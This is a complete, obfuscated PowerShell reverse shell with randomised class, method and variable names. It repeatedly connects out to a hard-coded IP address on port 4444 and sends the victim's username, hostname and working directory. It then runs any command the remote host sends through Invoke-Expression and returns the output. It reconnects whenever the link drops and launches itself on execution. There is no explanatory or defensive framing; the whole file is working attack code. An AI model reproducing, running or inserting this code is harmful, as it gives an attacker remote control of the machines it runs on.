class eeTWFXiXptLcNdmtMXSUNOdp {
    
    [string]$rAqWnEOVXnemlUZEhDUFq = "93.49.240.195"
    [int]$RENLHnX = 4444

    $xBclBE
    $OsUtcCRxmLdFXPIIPKD
    $XhHNNiSTpUQKfMHahLYhgHpT
    $mSJTFm
    $sQYakwWfOoYBkdpyXN
    $tNjITazlvXEb
    [int]$aBoIvBssnF = 50*1024

    VGSilpyTGxSVEfldXJTy() {
        $this.OsUtcCRxmLdFXPIIPKD = $false
        while ($true) {
            try {
                $this.OsUtcCRxmLdFXPIIPKD = New-Object Net.Sockets.TcpClient($this.rAqWnEOVXnemlUZEhDUFq, $this.RENLHnX)
                break
            } catch [System.Net.Sockets.SocketException] {
                Start-Sleep -Seconds 5
            }
        }
        $this.GAEWzYIEONI()
    }

    GAEWzYIEONI() {
        $this.xBclBE = $this.OsUtcCRxmLdFXPIIPKD.GetStream()
        $this.mSJTFm = New-Object Byte[] $this.aBoIvBssnF
        $this.tNjITazlvXEb = New-Object Text.UTF8Encoding
        $this.XhHNNiSTpUQKfMHahLYhgHpT = New-Object IO.StreamWriter($this.xBclBE, [Text.Encoding]::UTF8, $this.aBoIvBssnF)
        $this.sQYakwWfOoYBkdpyXN = New-Object System.IO.StreamReader($this.xBclBE)
        $this.XhHNNiSTpUQKfMHahLYhgHpT.AutoFlush = $true
    }

    kOSQBeodZktfagauhtbORMx() {
        $this.VGSilpyTGxSVEfldXJTy()
        $this.BbbMfMIAuwhLOENFlCX()
    }

    txfsBVRszlOOSdrAOmdT($PrinABILRdeuOs) {
        try {
            [byte[]]$RpbgdGNjLnvZZ = [text.Encoding]::Ascii.GetBytes($PrinABILRdeuOs)
            $this.XhHNNiSTpUQKfMHahLYhgHpT.Write($RpbgdGNjLnvZZ, 0, $RpbgdGNjLnvZZ.length)   
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.kOSQBeodZktfagauhtbORMx()
        }
    }

    [string] xBjfEFSyRLcZEzFFwe() {
        try {
            $sMfwrAZHOZCbxOqQawqsA = $this.xBclBE.Read($this.mSJTFm, 0, $this.aBoIvBssnF)    
            $UntHfLjkeOY = ($this.tNjITazlvXEb.GetString($this.mSJTFm, 0, $sMfwrAZHOZCbxOqQawqsA))
            return $UntHfLjkeOY
        } catch [System.Management.Automation.MethodInvocationException] {
            $this.kOSQBeodZktfagauhtbORMx()
            return ""
        }
    }

    [string] aBIkkCJ($WpOwFdMDpk) {
        Write-Host $WpOwFdMDpk
        try { 
            $XgLrfmEkWdIpNAiWsQLCTlBV = Invoke-Expression $WpOwFdMDpk | Out-String
        }
        catch {
            $QFbnqeg = $_.Exception
            $KiCGkmJZmTswQb = $_.Message
            $XgLrfmEkWdIpNAiWsQLCTlBV = "`n$_`n"
        }
        return $XgLrfmEkWdIpNAiWsQLCTlBV
    }

    [string] snhtSlZNiytdor() {
        $JFmvDIBGQhAoPbgruQ = [Environment]::UserName
        $oEhMbhUaOHjQkuRj = [System.Net.Dns]::GetHostName()
        $eHaahDoPafLi = Get-Location
        return "$JFmvDIBGQhAoPbgruQ@$oEhMbhUaOHjQkuRj [$eHaahDoPafLi]~$ "
    }

    BbbMfMIAuwhLOENFlCX() {
        while ($this.OsUtcCRxmLdFXPIIPKD.Connected) {
            $this.txfsBVRszlOOSdrAOmdT($this.snhtSlZNiytdor())         
            $UntHfLjkeOY = $this.xBjfEFSyRLcZEzFFwe()
            $XgLrfmEkWdIpNAiWsQLCTlBV = "`n"
            if ([string]::IsNullOrEmpty($UntHfLjkeOY)) {
                continue
            }
            $XgLrfmEkWdIpNAiWsQLCTlBV = $this.aBIkkCJ($UntHfLjkeOY)
            $this.txfsBVRszlOOSdrAOmdT($XgLrfmEkWdIpNAiWsQLCTlBV + "`n")
            $this.xBclBE.Flush()
        }
        $this.OsUtcCRxmLdFXPIIPKD.Close()
        $this.kOSQBeodZktfagauhtbORMx()
    } 
}

$CsxRVfNJSsLBlwv = [eeTWFXiXptLcNdmtMXSUNOdp]::new()
$CsxRVfNJSsLBlwv.kOSQBeodZktfagauhtbORMx()
